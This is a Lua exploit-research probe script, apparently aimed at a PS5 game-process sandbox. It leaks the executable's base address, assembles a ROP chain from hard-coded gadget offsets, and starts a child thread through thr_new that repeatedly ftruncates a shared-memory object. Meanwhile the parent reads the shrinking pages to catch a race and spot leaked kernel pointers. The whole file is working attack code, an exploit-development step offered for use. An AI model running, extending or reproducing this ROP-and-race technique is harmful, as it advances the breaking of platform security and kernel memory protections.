-- CRASH_CLASS: HIGH
-- PROBE 1100c: SHM ftruncate race — child ftruncates, parent reads boundary pages
--
-- Simpler design: one child thread loops ftruncate via ROP, parent Lua reads
-- the mapped pages. Pattern the child exactly on 56l's working thr_new.

print("=== PROBE 1100c: SHM FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Gadgets
local pop_rax_ret = eaddr(0x992)
local pop_rdi_ret = eaddr(0xC9DFE)
local pop_rsi_ret = eaddr(0xD77D)
local mov_rdi_rax_ret = eaddr(0x92C67)
local fn_addr = uint64(tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)"))

local sc455 = mk(455)
local sc480 = mk(480)  -- ftruncate
local sc482 = mk(482)  -- shm_open
local sc477 = mk(477)  -- mmap

-- Create SHM object
local LARGE = 0x40000   -- 256KB
local SMALL = 0x4000    -- 16KB (1 PS5 page)
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAILED") return end

N(sc480(uint64(shm_fd), uint64(LARGE)))

local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
print("map=" .. fmt(map))

-- Write sentinel to each 16KB page
for p = 0, 15 do
    wd(N(map) + p * 0x4000, 0xAA000000 + p)
    wd(N(map) + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Shared completion marker
local done_flag = memory.alloc(8)
wq(done_flag, uint64(0))

-- Build child thread: sysarch(SET_FSBASE) then loop ftruncate small/large, then write marker
-- Pattern from 56l: use mmap for stack, exact struct layout
local stack1 = sc477(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print("child_stack=" .. fmt(stack1))

local ITERS = 50
-- Chain: sysarch, then ITERS x (ftruncate small, ftruncate large), then write marker, then jmp$
-- jmp$ is an infinite loop gadget to park the thread
-- Find jmp$ (EB FE) in eboot
local jmp_self = nil
for off = 0, 0x180000 - 2, 2 do
    local b = rd(tlo + off)
    if b then
        if (b % 0x10000) == 0xFEEB then
            jmp_self = off
            break
        end
    end
end
if jmp_self then
    print(string.format("jmp$=eboot+0x%X", jmp_self))
else
    print("no jmp$ found, using bare_ret loop")
    jmp_self = 0x42 -- bare_ret, will just fall through
end

-- Build ROP chain on the stack
-- RSP = ((stack_base + stack_size) & ~0xF) - 8 = ((stack1 + 0x10000) & ~0xF) - 8
local stack1_n = N(stack1)
local rsp_n = math.floor((stack1_n + 0x10000) / 16) * 16 - 8

-- Chain entries: pop_rax_ret is the entry point (start_func)
-- RSP[0] = first value popped by pop_rax
local chain = {}

-- Fake TCB for sysarch
local tcb = memory.alloc(0x1000)
wq(tcb, tcb) -- self-ref
local fsb = memory.alloc(8)
wq(fsb, tcb)

-- sysarch(165, 129, &fsb)
chain[#chain+1] = uint64(165)    -- rax = SYS_SYSARCH
chain[#chain+1] = pop_rdi_ret
chain[#chain+1] = uint64(129)   -- SET_FSBASE
chain[#chain+1] = pop_rsi_ret
chain[#chain+1] = uint64(N(fsb))
chain[#chain+1] = fn_addr       -- syscall stub
chain[#chain+1] = pop_rax_ret

-- Loop: ftruncate(fd, SMALL) then ftruncate(fd, LARGE)
for i = 1, ITERS do
    chain[#chain+1] = uint64(480)     -- SYS_FTRUNCATE
    chain[#chain+1] = pop_rdi_ret
    chain[#chain+1] = uint64(shm_fd)
    chain[#chain+1] = pop_rsi_ret
    chain[#chain+1] = uint64(SMALL)
    chain[#chain+1] = fn_addr
    chain[#chain+1] = pop_rax_ret

    chain[#chain+1] = uint64(480)
    chain[#chain+1] = pop_rdi_ret
    chain[#chain+1] = uint64(shm_fd)
    chain[#chain+1] = pop_rsi_ret
    chain[#chain+1] = uint64(LARGE)
    chain[#chain+1] = fn_addr
    chain[#chain+1] = pop_rax_ret
end

-- Write done marker
chain[#chain+1] = uint64(0xDEAD1100)
chain[#chain+1] = pop_rdi_ret
chain[#chain+1] = uint64(N(done_flag))
chain[#chain+1] = mov_rdi_rax_ret

-- Park on jmp$
chain[#chain+1] = eaddr(jmp_self)

print(string.format("chain: %d entries (%d bytes)", #chain, #chain * 8))

-- Write chain to stack top
for i, val in ipairs(chain) do
    wq(uint64(rsp_n + (i-1) * 8), val)
end
print("chain written")

-- Build thr_param (exact 56l pattern)
local tid_p = memory.alloc(8)
wq(tid_p, uint64(0))

local p1 = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(p1) + i, 0) end
wq(p1, pop_rax_ret)                              -- start_func
wq(uint64(N(p1) + 0x08), uint64(0))              -- arg
wq(uint64(N(p1) + 0x10), stack1)                 -- stack_base
wq(uint64(N(p1) + 0x18), uint64(0x10000))        -- stack_size
wq(uint64(N(p1) + 0x30), uint64(N(tid_p)))       -- child_tid

-- Launch child
print("launching child...")
local ok1, ret1 = pcall(function()
    return sc455(uint64(N(p1)), uint64(0x38))
end)
print("thr_new ret=" .. (ok1 and tostring(N(ret1)) or "FAIL"))

-- Busy wait for child to start
local x = 0; for k = 1, 30000 do x = x + k end

local tid1 = rq(tid_p)
print("child_tid=" .. fmt(tid1))

if not ok1 or N(ret1) ~= 0 then
    print("child launch failed")
    print("=== PROBE 1100c FAILED ===")
    return
end

-- Now race: parent reads boundary pages while child ftruncates
print("")
print("--- RACING ---")
local kptr_count = 0
local fault_count = 0
local anomaly_count = 0
local read_count = 0
local stale_count = 0

for round = 1, 200 do
    -- Read pages 1-3 (offsets 0x4000, 0x8000, 0xC000)
    -- These vanish when child ftruncates to SMALL
    for pg = 1, 3 do
        local off = pg * 0x4000
        local val = rq(uint64(N(map) + off))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
        else
            local h, l = 0, 0
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print(string.format("  [KPTR!] round %d page %d: 0x%08X%08X", round, pg, h, l))
            end

            local expected_lo = 0xAA000000 + pg
            local expected_hi_lo = 0xBB000000 + pg
            if l ~= expected_lo and l ~= 0 and h ~= 0 then
                -- Not our sentinel and not zero
                anomaly_count = anomaly_count + 1
                if anomaly_count <= 5 then
                    print(string.format("  [ANOM] round %d page %d: 0x%08X%08X", round, pg, h, l))
                end
            end
            if l == 0 and h == 0 then
                -- Page was zeroed (re-allocated fresh)
                stale_count = stale_count + 1
            end
        end
    end

    -- Check if child is done
    local df = rd(N(done_flag))
    if df == 0xDEAD1100 then
        print(string.format("child done after round %d", round))
        break
    end
end

print("")
print(string.format("reads=%d faults=%d kptrs=%d anomalies=%d zeroed=%d",
    read_count, fault_count, kptr_count, anomaly_count, stale_count))

-- Re-check sentinels
print("")
print("--- SENTINEL CHECK ---")
for p = 0, 15 do
    local v = rd(N(map) + p * 0x4000)
    local expected = 0xAA000000 + p
    if v ~= expected then
        print(string.format("  page %d: 0x%08X (expected 0x%08X)", p, v or 0, expected))
    end
end

print("alive=" .. tostring(alive()))
print("")
print("=== PROBE 1100c COMPLETE ===")
